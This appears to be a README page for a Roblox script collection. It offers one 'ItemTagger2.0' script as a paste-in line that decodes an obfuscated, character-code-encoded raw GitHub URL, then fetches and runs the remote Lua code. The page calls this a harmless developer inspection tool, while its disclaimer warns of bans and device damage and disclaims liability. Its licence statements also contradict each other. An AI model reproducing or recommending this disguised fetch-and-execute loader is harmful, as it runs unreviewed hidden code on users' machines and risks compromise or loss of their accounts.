<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Roblox Script Loader Collection</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            line-height: 1.6;
            background-color: #f4f4f4;
            color: #333;
            margin: 0;
            padding: 0;
        }
        header {
            background-color: #333;
            color: #fff;
            padding: 10px 20px;
            text-align: center;
        }
        header h1 {
            margin: 0;
        }
        .container {
            max-width: 900px;
            margin: 20px auto;
            background: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        h2, h3 {
            color: #333;
        }
        p {
            margin: 10px 0;
        }
        ul {
            list-style: none;
            padding-left: 0;
        }
        ul li {
            padding: 5px;
            background-color: #e9ecef;
            margin: 5px 0;
            border-radius: 5px;
        }
        code {
            background-color: #f1f1f1;
            padding: 5px;
            border-radius: 5px;
        }
        pre {
            background-color: #f1f1f1;
            padding: 15px;
            border-radius: 5px;
            overflow-x: auto;
        }
        .back-to-top {
            margin-top: 20px;
            text-align: center;
        }
        .back-to-top a {
            color: #007bff;
            text-decoration: none;
        }
        .back-to-top a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>

<header>
    <h1>Roblox Script Loader Collection</h1>
</header>

<div class="container">
    <h2>⚠️ DISCLAIMER ⚠️</h2>
    <p><strong>WARNING: Use at your own risk.</strong> The scripts provided in this repository are intended for personal use and experimentation only. By using or accessing these scripts, you acknowledge that:</p>
    <ul>
        <li><strong>We are not responsible</strong> for any consequences, including but not limited to account bans, device damage, or any other harm resulting from using these scripts.</li>
        <li>If you are banned from Roblox or face any negative outcomes, <strong>we are not liable</strong>.</li>
        <li>The scripts are provided <strong>as-is</strong>, with no guarantee of functionality or future updates.</li>
        <li><strong>You have no right to sue</strong> or take legal action against us for any issues or dissatisfaction with the scripts provided.</li>
    </ul>
    <p>Proceed only if you understand and accept the risks associated with using these scripts. <strong>By continuing to use them, you agree to the terms of the <a href="LICENSE" target="_blank">No Redistribution License (NRL)</a>.</strong></p>

    <h2>🌟 Table of Contents</h2>
    <ul>
        <li><a href="#itemtagger20">ItemTagger2.0</a></li>
        <li><a href="#more-scripts-coming-soon">More Scripts Coming Soon</a></li>
    </ul>

    <h2 id="itemtagger20">🐜 1. ItemTagger2.0 Script</h2>
    <p>This is the first script in our collection. It dynamically loads the script from a remote server using a <code>loadstring()</code> and <code>HttpGet()</code> method.</p>

    <pre><code>
-- ItemTagger2.0 Script (First in the collection)

loadstring(game:HttpGet((function()local d="";for a in("104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,97,114,111,111,73,116,101,109,84,97,103,103,101,114,50,46,48,46,108,117,97"):gmatch("%d+")do d=d..string.char(tonumber(a))end;return d end)()))()
    </code></pre>

    <h3>💡 Usage</h3>
    <p>The <strong>ItemTagger2.0</strong> script is a great tool for inspecting items in your Roblox game. Here’s how you can use it:</p>
    <ul>
        <li><strong>Inspect Items in Your Game:</strong> This script allows you to inspect game items, making it easier for developers to see detailed information about objects, models, or anything within the game environment.</li>
        <li><strong>Script Development Tool:</strong> It’s a fantastic tool for script development because it provides an easy way to test and debug your scripts. You can use it to load and inspect items dynamically, which helps when creating new scripts and understanding how items behave.</li>
        <li><strong>Flexibility:</strong> The script can be modified and expanded to meet the specific needs of your game. Whether you're building a custom UI, working with items dynamically, or trying to learn more about objects, this script serves as a great starting point.</li>
    </ul>

    <h2 id="more-scripts-coming-soon">⚡ More Scripts Coming Soon</h2>
    <p>We're constantly adding new scripts to the collection. Stay tuned for more useful tools and utilities to enhance your Roblox game development.</p>

    <h2>⚠️ Important Notice</h2>
    <p><strong>You are NOT allowed to fork, reproduce, or redistribute anything from the <code>scripts</code> branch of this repository.</strong> Unauthorized sharing or modifications of the scripts from this branch are strictly prohibited.</p>

    <h2>📜 License</h2>
    <p>Distributed under the Unlicense License. See <a href="LICENSE.txt" target="_blank">LICENSE.txt</a> for more information.</p>

    <div class="back-to-top">
        <a href="#readme-top">Back to Top</a>
    </div>
</div>

</body>
</html>
